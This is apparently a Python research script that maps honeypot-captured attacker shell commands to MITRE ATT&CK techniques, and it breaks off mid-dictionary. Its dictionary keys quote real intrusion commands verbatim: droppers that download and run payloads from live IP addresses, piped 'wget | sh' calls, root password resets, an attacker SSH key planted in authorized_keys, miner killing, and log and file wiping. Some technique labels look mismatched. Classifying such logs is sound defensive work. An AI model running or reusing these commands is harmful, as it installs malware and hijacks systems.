# --coding:utf-8--
"""
Step 07a (2024, earlier variant): Map commands to MITRE ATT&CK techniques.

Older version of the attack-technique mapping (ported from 7-攻击行为划分.py;
the main version is 07a_map_attack_techniques.py, ported from 7-攻击行为划分-1.py).
Kept for fidelity with the paper's pipeline. Reads the unsorted complex-command
analysis file (4-复杂指令类型分析.json) rather than the -sorted variant.

Input  : DATA_DIR/5-session归类.json (clustered sessions),
         DATA_DIR/4-复杂指令类型分析.json (complex-command patterns)
Output : an interactive networkx ATT&CK transition plot
         (the JSON dump of session-ATT&CK is commented out in this variant).
"""
import os
import json,re,ast
from itertools import chain,groupby

# === Config ===
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")

with open(os.path.join(DATA_DIR, '5-session归类.json'), 'r') as file:
    session_dict = json.load(file)
with open(os.path.join(DATA_DIR, '4-复杂指令类型分析.json'), 'r') as file:
    compound_commands_dict = json.load(file)


simple_commands_attck= {
  "T1016 System Network Configuration Discovery": [
    "/ip",
    "ifconfig"
  ],
  "T1087 Account Discovery":[
"uname","w"
  ],

  "T1082 System Information Discovery": [
    "lscpu",
    "screenfetch",

  ],
  "T1057 Process Discovery": [
    "ps",
    "top"
  ],
  "T1083 File and Directory Discovery": [
    "cat",
    "which",
    "cd",
    "ls",
    "pwd"
  ],
  "T1053 Scheduled Task/Job": [
    "Cron",
    "crontab"
  ],
  "T1059 Command and Scripting Interpreter": [
    "debug",
    "cmd",
    "start",
    "/bin/busybox",
    "/tmp/ntpclient",
    "bash",
    "busybox",
    "echo",
    "enable",
    "exec",
    "help",
    "linuxshell",
    "runshellcmd",
    "sh",
    "shell",
    "start-shell",
    "system",
    "vshell",
    "python",
    "config",
    "./",
    "development"
  ],
  "T1070 Indicator Removal": [
    "clear",
    "rm"
  ],
  "T1098 Account Manipulation": [
    "mkdir"
  ],
  "T1105 Ingress Tool Transfer": [
    "scp",
    "wget",
    "apt"
  ],
  "T1222 File and Directory Permissions Modification": [
    "chmod"
  ],
  "T1489 Service Stop": [
    "kill"
  ],
  "T1531 Account Access Removal": [
    "passwd"
  ],
  "T1037 Boot or Logon Initialization Scripts": [
    "/system"
  ],
  "T1548 Abuse Elevation Control Mechanism": [
    "su",
    "sudo"
  ]
}

compound_commands_attck= {'echo -e "celery\\n2pKgu6yufneU\\n2pKgu6yufneU"|passwd|bash':["T1531 Account Access Removal","T1059 Command and Scripting Interpreter"],
 'echo "celery\\n2pKgu6yufneU\\n2pKgu6yufneU\\n"|passwd':["T1531 Account Access Removal"],
 'echo "root:ohb95XhZ87sR"|chpasswd|bash':["T1531 Account Access Removal","T1059 Command and Scripting Interpreter"],
 'cat /proc/mounts; /bin/busybox NDNYN':["T1082 System Information Discovery","T1059 Command and Scripting Interpreter"],
 'cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox NDNYN':["T1083 File and Directory Discovery","T1070 Indicator Removal","T1027 Obfuscated Files or Information","T1059 Command and Scripting Interpreter"],
 'tftp; wget; /bin/busybox NDNYN':["T1105 Ingress Tool Transfer","T1059 Command and Scripting Interpreter"],
 "echo -ne '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' >> 812969":["T1027 Obfuscated Files or Information"],
 "echo -ne '\\x00\\x10\\x00\\x00\\x00\\x01\\x6E\\xDB\\x00\\x01\\x6E\\xDB\\x00\\x00\\x00\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x64\\x70\\x00\\x48\\x64\\x70\\x00\\x48\\x64\\x70\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x06\\x00\\x01\\x00\\x00\\x7B\\x73\\xA5\\xF4\\x55\\x50\\x58\\x21\\x09\\xE0\\x0D\\x89'>>./catbpnhz":["T1027 Obfuscated Files or Information"],
 "echo -ne '\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x07\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x30\\xa2\\x00\\xff\\x30\\xe7\\x00\\xff\\x00\\x02\\x14\\x00\\x00\\x47\\x10\\x25\\x00\\x04\\x26\\x00\\x30\\xc6\\x00\\xff\\x00\\x44\\x10\\x25\\x00\\x06\\x32\\x00\\x03\\xe0\\x00\\x08\\x00\\x46\\x10\\x25\\x3c\\x1c\\x00\\x02\\x27\\x9c\\x88\\x68\\x03\\x99\\xe0\\x21\\x8f\\x99\\x80\\x54\\x00\\x80\\x28\\x21\\x03\\x20\\x00\\x08\\x24\\x04\\x0f\\xa1\\x3c\\x1c\\x00\\x02\\x27\\x9c\\x88\\x4c\\x03\\x99\\xe0\\x21\\x8f\\x99\\x80\\x54\\x00\\x80\\x28\\x21\\x03\\x20\\x00\\x08\\x24\\x04\\x0f\\xa6' >> ddnsclient; echo -e '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45'":["T1027 Obfuscated Files or Information"],
 "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /; rm -rf i; wget http://192.168.1.1:8088/i; curl -O http://192.168.1.1:8088/i; /bin/busybox wget http://192.168.1.1:8088/i; chmod 777 i || (cp /bin/ls ii;cat i>ii;rm i;cp ii i;rm ii); ./i; echo -e '\\x63\\x6F\\x6E\\x6E\\x65\\x63\\x74\\x65\\x64'":
 ["T1083 File and Directory Discovery","T1070 Indicator Removal", "T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter","T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1027 Obfuscated Files or Information"],
 'wget http://2.58.149.116/ssh/spc -O- > ntpclient; chmod 777 ntpclient; ./ntpclient test.wget.spc':["T1105 Ingress Tool Transfer" ,"T1655 Masquerading", "T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter"],
 ">/tmp/.l && cd /tmp/; echo -en '\\x50\\x41\\x54\\x48\\x5f\\x44\\x4f\\x4e\\x45' || ./helloworld":["T1059 Command and Scripting Interpreter","T1027 Obfuscated Files or Information","T1059 Command and Scripting Interpreter"],
 'echo "321" > /var/tmp/.var03522123':["T1027 Obfuscated Files or Information"],
 "echo -ne '\\x7f\\x45\\x4c\\x46\\x01\\x01\\x01\\x61\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x28\\x00\\x01\\x00\\x00\\x00\\x54\\x83\\x00\\x00\\x34\\x00\\x00\\x00\\xa0\\x0d\\x00\\x00\\x02\\x02\\x00\\x00\\x34\\x00\\x20\\x00\\x03\\x00\\x28\\x00\\x05\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x80\\x00\\x00\\x80\\x0d\\x00\\x00\\x80\\x0d\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x01\\x00\\x00\\x00\\x80\\x0d\\x00\\x00\\x80\\x0d\\x01\\x00\\x80\\x0d\\x01\\x00\\x00\\x00\\x00\\x00\\xa0\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x51\\xe5\\x74\\x64\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' > 686840":["T1027 Obfuscated Files or Information"],
 'chmod 777 686840;busybox chmod 777 686840':["T1222 File and Directory Permissions Modification","T1027 Obfuscated Files or Information"],
 'cd /tmp && chmod +x Lhtln3CT && bash -c ./Lhtln3CT':["T1083 File and Directory Discovery","T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter" ],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.42.231/sensi.sh; curl -O http://209.141.42.231/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 209.141.42.231 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 209.141.42.231; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.42.231 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://31.210.20.48/dirdir000/0s1s12.x86; cat 0s1s12.x86 > z1z2z5a6qw5asda; chmod +x z1z2z5a6qw5asda; ./z1z2z5a6qw5asda Rooted.VPS; history -c':
["T1082 System Information Discovery","T1083 File and Directory Discovery"],
 'wget 62.197.136.157/x-8.6-.Sakura; chmod 777 x-8.6-.Sakura; ./x-8.6-.Sakura x86_64':
["T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter" ],
 'echo -n n06m5xox|md5sum;uname -a':
["T1027 Obfuscated Files or Information","T1082 System Information Discovery"],
 'cd /tmp || cd /run || cd /; wget http://134.122.65.100/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 134.122.65.100 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 134.122.65.100; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter" ,"T1070 Indicator Removal"],
 'cd /tmp  cd /var/run  cd /mnt  cd /root  cd /; wget http://65.21.189.187/zeros6x.sh; curl -O http://65.21.189.187/zeros6x.sh; chmod 777 zeros6x.sh; sh zeros6x.sh; tftp 65.21.189.187 -c get zeros6x.sh; chmod 777 zeros6x.sh; sh zeros6x.sh; tftp -r zeros6x2.sh -g 65.21.189.187; chmod 777 zeros6x2.sh; sh zeros6x2.sh; ftpget -v -u anonymous -p anonymous -P 21 65.21.189.187 zeros6x1.sh zeros6x1.sh; sh zeros6x1.sh; rm -rf zeros6x.sh zeros6x.sh zeros6x2.sh zeros6x1.sh; rm -rf *':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification","T1059 Command and Scripting Interpreter" ,"T1070 Indicator Removal"],
 "echo -ne '\\x7f\\x45\\x4c\\x46\\x01\\x02\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x08\\x00\\x00\\x00\\x01\\x00\\x40\\x04\\x7c\\x00\\x00\\x00\\x34\\x00\\x00\\x09\\xc0\\x00\\x00\\x10\\x07\\x00\\x34\\x00\\x20\\x00\\x03\\x00\\x28\\x00\\x06\\x00\\x05\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x09\\x34\\x00\\x00\\x09\\x34\\x00\\x00\\x00\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x09\\x40\\x00\\x41\\x09\\x40\\x00\\x41\\x09\\x40\\x00\\x00\\x00\\x54\\x00\\x00\\x00\\x54\\x00\\x00\\x00\\x06\\x00\\x01\\x00\\x00\\x64\\x74\\xe5\\x51\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' > ddnsclient; echo -e '\\x45\\x43\\x48\\x4f\\x44\\x4f\\x4e\\x45'":
["T1027 Obfuscated Files or Information" ],
 'cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://179.43.176.41/cometome; cat cometome > meth; chmod +x meth; chmod 777 meth; ./meth; history -c':
["T1082 System Information Discovery","T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter" ,"T1070 Indicator Removal" ],
 'echo -n AfzDTzW4|md5sum':
["T1027 Obfuscated Files or Information" ],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://20.97.23.106/Sakura.sh; chmod 777 *; sh Sakura.sh; tftp -g 20.97.23.106 -r tftp1.sh; chmod 777 *; sh tftp1.sh; busybox wget http://20.97.23.106/Sakura.sh; chmod 777 *; sh Sakura.sh; rm -rf *.sh; history -c':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter" ,"T1070 Indicator Removal"],
 'rm .s; tftp -l.i -r.i -g 202.124.228.63:45536; chmod 777 .i; ./.i; exit':
["T1070 Indicator Removal" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter" ],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.43.118/sh; curl -O http://209.141.43.118/sh; chmod 777 sh; sh sh; tftp 209.141.43.118 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 209.141.43.118; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.43.118 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter" ,"T1070 Indicator Removal"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget 209.141.58.203/ssh || curl -o ssh 209.141.58.203/ssh; tar xvf ssh; cd .ssh; chmod +x *; ./sshd; ./krane 123456':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 123456':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'cat /var/tmp/.var03522123 | head -n 1':
["T1005 Data from Local System"],
 'cat /etc/issue; hive-passwd wazg0d1s23':
["T1082 System Information Discovery" ,"T1531 Account Access Removal"],
 'cd /tmp || cd /var/run || cd /sys || cd /bin || cd /mnt || cd /root || cd /; wget http://109.104.151.108/mtr.sh; busybox wget http://109.104.151.108/mtr.sh; curl -O http://109.104.151.108/mtr.sh; chmod +x mtr.sh; sh mtr.sh; rm -rf mtr.sh; tftp 109.104.151.108 -c get mtr1.sh; chmod 777 mtr1.sh; sh mtr1.sh; tftp -r mtr2.sh -g 109.104.151.108; chmod +x mtr2.sh; sh mtr2.sh; rm -rf *.sh; history -c':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter","T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal" ],
 'ping;sh':
[ "T1016 System Network Configuration Discovery","T1059 Command and Scripting Interpreter"],
 '/bin/busybox cat /bin/busybox || while read i; do /bin/busybox echo $i; done < /bin/busybox || /bin/busybox dd if=/bin/busybox bs=22 count=1':
["T1005 Data from Local System", "T1027 Obfuscated Files or Information" ,"T1059 Command and Scripting Interpreter"],
 "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'":
["T1082 System Information Discovery" ],
 "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'":
["T1082 System Information Discovery" ],
 'ls -lh $(which ls)':
["T1005 Data from Local System","T1059 Command and Scripting Interpreter"],
 'cat /proc/cpuinfo | grep name | wc -l':
["T1082 System Information Discovery"],
 'cat /proc/cpuinfo | grep model | grep name | wc -l':
["T1082 System Information Discovery"],
 'lscpu | grep Model':
["T1082 System Information Discovery"],
 'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~':
["T1531 Account Access Removal","T1222 File and Directory Permissions Modification"],
 'dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s':
["T1005 Data from Local System", "T1059 Command and Scripting Interpreter"],
 'rm .s; exit':
["T1070 Indicator Removal"],
 "wget --help >/dev/null && echo -e '\\x57\\x47\\x45\\x54\\x5f\\x46\\x4f\\x55\\x4e\\x44';curl --help >/dev/null && echo -e '\\x43\\x55\\x52\\x4c\\x5f\\x46\\x4f\\x55\\x4e\\x44';ftpget --help >/dev/null && echo -e '\\x46\\x54\\x50\\x5f\\x46\\x4f\\x55\\x4e\\x44'; echo -e '\\x45\\x43\\x48\\x4f\\x5f\\x46\\x4f\\x55\\x4e\\x44'":
["T1518 Software Discovery"],
 'wget http://2.58.149.116/w -O- | sh; curl http://2.58.149.116/c -O- | sh':
["T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter",],
 "cd /tmp || cd /var/ || cd /var/run || cd /mnt || cd /root || cd /;/bin/busybox echo -ne '\\x45\\x4c\\x46'":
["T1083 File and Directory Discovery" ,"T1027 Obfuscated Files or Information" ],
 "/bin/busybox wget;/bin/busybox echo -ne '\\x45\\x4c\\x46'":
["T1083 File and Directory Discovery" ,"T1027 Obfuscated Files or Information" ],
 "ps | grep '[Mm]iner'":
["T1424 Process Discovery"],
 "ps -ef | grep '[Mm]iner'":
["T1424 Process Discovery",],
 'echo Hi | cat -n':
["T1059 Command and Scripting Interpreter"],
 "cp /bin/echo //.f && >//.f && echo -e '\\x67\\x6f\\x6f\\x64\\x77\\x72\\x69\\x74\\x65' && chmod 777 //.f; echo -e '\\x63\\x6d\\x64\\x67\\x6f\\x74'":
["T1027 Obfuscated Files or Information" ,"T1070 Indicator Removal" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'cd //; wget http://2.58.149.116/spc -O- > .f; ./.f s.spc; >.f; echo test':
["T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter"],
 '>/tmp/.a && cd /tmp; >/dev/.a && cd /dev;wget http://2.58.149.116/spc -O- >.f;chmod 777 .f;./.f scan.wget.spc':
["T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'wget 2>&1;curl 2>&1;ftpget 2>&1':
["T1518 Software Discovery"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.23.172.240/100UP.sh; curl -O http://198.23.172.240/100UP.sh; chmod 777 100UP.sh; sh 100UP.sh; rm -rf *':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter", "T1070 Indicator Removal"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf installer.sh; wget http://51.75.170.84/installer.sh; chmod 777 installer.sh; sh installer.sh; rm -rf tftp1.sh; tftp 51.75.170.84 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; rm -rf tftp2.sh; tftp -r tftp2.sh -g 51.75.170.84; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf *':
["T1083 File and Directory Discovery" ,"T1070 Indicator Removal" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter", "T1070 Indicator Removal"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /':
["T1083 File and Directory Discovery" ],
 'cd /tmp || cd $(find / -writable | head -n 1);':
["T1083 File and Directory Discovery" ],
 'find / -writable | head -n 1':
["T1083 File and Directory Discovery" ],
 'cat /proc/cpuinfo | grep name | wc -l | head -c 30':
["T1082 System Information Discovery" ],
 'cd /tmp; wget 51.79.55.208:8281/sshd -O /tmp/sshd; curl 51.79.55.208:8281/sshd -o /tmp/sshd; bash /tmp/sshd; rm -rf /tmp/sshd; rm -r /tmp/sshd; rm -rf /var/tmp/sshd; rm -rf /var/tmp/sshd.*; rm -rf /tmp/sshd.*':
["T1105 Ingress Tool Transfer" ,"T1059 Command and Scripting Interpreter", "T1070 Indicator Removal"],
 'cat /etc/issue; wget http://45.10.24.18/x86_64; chmod 777 x86_64; ./x86_64 skids':
["T1082 System Information Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'cd /tmp || cd /var/run || cd /sys || cd /bin || cd /mnt || cd /root || cd /; wget http://109.104.151.108/mtro/zmbot.x86; busybox wget http://109.104.151.108/mtro/zmbot.x86; curl -O http://109.104.151.108/mtro/zmbot.x86; chmod +x zmbot.x86; ./zmbot.x86 Selfrep.x86; tftp 109.104.151.108 -c get xbot; chmod 777 xbot; ./xbot Exploit.x86; tftp -r xbot -g 109.104.151.108; chmod 777 xbot; ./xbot tftp.Exploit.x86; rm -rf xbot zmbot.x86; history -c':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://179.43.176.41/1a9zxq/meth.x86; cat meth.x86 > meth; chmod +x meth; chmod 777 *; ./meth rooted; cat /etc/issue; cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget -q http://179.43.176.41/cometome; cat cometome > meth; chmod +x meth; chmod 777 *; ./meth; history -c':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'cd /tmp  cd /run  cd /; wget http://134.122.67.26/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 134.122.67.26 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 134.122.67.26; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'rm -rf ddnsclient;rm -rf ntpclient; cp /bin/echo ddnsclient; >ddnsclient; cp ddnsclient ntpclient; chmod 777 ddnsclient; chmod 777 ntpclient':
["T1070 Indicator Removal" ,"T1027 Obfuscated Files or Information" ,"T1655 Masquerading","T1222 File and Directory Permissions Modification"],
 './ddnsclient; chmod 777 ntpclient; ./ntpclient':
["T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'wget http://78.157.39.60/we.sh; chmod 777 *; sh we.sh':
["T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'cat /etc/issue; cd /tmp; rm -rf x86_64; wget http://45.14.149.244/x86_64; chmod 777 x86_64; ./x86_64 x86hxed; echo firewalla1337 & Anarchy were here':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'cp /bin/echo /tmp/ntpclient; >/tmp/ntpclient; chmod 777 /tmp/ntpclient':
["T1655 Masquerading" ,"T1222 File and Directory Permissions Modification" ],
 'cd /tmp; wget http://205.185.126.254/korpze_jaws.sh; curl -O http://205.185.126.254/korpze_jaws.sh; chmod 777 korpze_jaws.sh; sh korpze_jaws.sh; tftp 205.185.126.254 -c get korpze_jaws1.sh; chmod 777 korpze_jaws1.sh; sh korpze_jaws1.sh; tftp -r korpze_jaws2.sh -g 205.185.126.254; chmod 777 korpze_jaws2.sh; sh korpze_jaws2.sh; rm -rf korpze_jaws.sh korpze_jaws1.sh korpze_jaws2.sh':
["T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal" ],
 '(uname -smr || /bin/uname -smr || /usr/bin/uname -smr)':
["T1087 Account Discovery" ],
 'pkill YDEdr; pkill ip; pkill xmrig; pkill cnrig; pkill kswapd0; pkill x86_64; pkill x86; cd /tmp; rm -rf config.json; rm -rf kitten; wget http://88.218.17.142/boom.sh; curl -O http://88.218.17.142/boom.sh; busybox wget http://88.218.17.142/boom.sh; chmod 777 *; sh boom.sh; cat /etc/issue;':
["T1489 Service Stop" ,"T1070 Indicator Removal" ,"T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1082 System Information Discovery"],
 "/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'":
["T1083 File and Directory Discovery" ,"T1027 Obfuscated Files or Information" ],
 "gayfgtmulti-callREPOR/bin/busybox;echo -e '\\147\\141\\171\\146\\147\\164'":
["T1083 File and Directory Discovery" ,"T1027 Obfuscated Files or Information" ],
 'cat /proc/cpuinfo | grep name | cut -f2 -d: | uniq -c; nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c':
["T1082 System Information Discovery"],
 'cd /tmp || cd /; wget -q http://209.141.40.31/Y91/x86; curl -O http://209.141.40.31/Y91/x86 chmod +x *; ./x86':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter"],
 'lscpu ; nproc ; wget https://cdn.discordapp.com/attachments/834709504049414155/836553024704348200/NTeleportation.cs':
["T1082 System Information Discovery","T1105 Ingress Tool Transfer"],
 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://194.87.139.100/x86/GhOul.sh; chmod 777 GhOul.sh; sh GhOul.sh; tftp 194.87.139.100 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 194.87.139.100; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 194.87.139.100 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf GhOul.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *':
["T1083 File and Directory Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter" , "T1070 Indicator Removal"],
 'cat /etc/issue; cd /tmp; rm -rf x86_64; wget http://45.14.149.244/x86_64; chmod 777 x86_64; ./x86_64 test; echo firewalla1337 and Anarchy were here':
["T1082 System Information Discovery" ,"T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter" ],
 'uname -s -v -n -r;nproc;':
["T1087 Account Discovery" ,"T1082 System Information Discovery"],
 'cd /tmp || cd /var/run || cd /sys || cd /bin || cd /mnt || cd /root || cd /; wget http://109.104.151.108/mtr.sh;; curl -O http://109.104.151.108/mtr.sh; chmod +x mtr.sh; sh mtr.sh; tftp 109.104.151.108 -c get mtr1.sh; chmod 777 mtr1.sh; sh mtr1.sh; tftp -r mtr2.sh -g 109.104.151.108; chmod 777 mtr2.sh; sh mtr2.sh; rm -rf *.sh; history -c':
["T1083 File and Directory Discovery","T1105 Ingress Tool Transfer" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
 'wget http://109.104.151.108/mtr.sh; busybox wget http://109.104.151.108/mtr.sh; curl -O http://109.104.151.108/mtr.sh; chmod +x mtr.sh; sh mtr.sh; tftp 109.104.151.108 -c get mtr1.sh; chmod 777 mtr1.sh; sh mtr1.sh; tftp -r mtr2.sh -g 109.104.151.108; chmod 777 mtr2.sh; sh mtr2.sh; rm -rf *.sh; history -c':
["T1105 Ingress Tool Transfer" ,"T1027 Obfuscated Files or Information" ,"T1222 File and Directory Permissions Modification" ,"T1059 Command and Scripting Interpreter","T1070 Indicator Removal"],
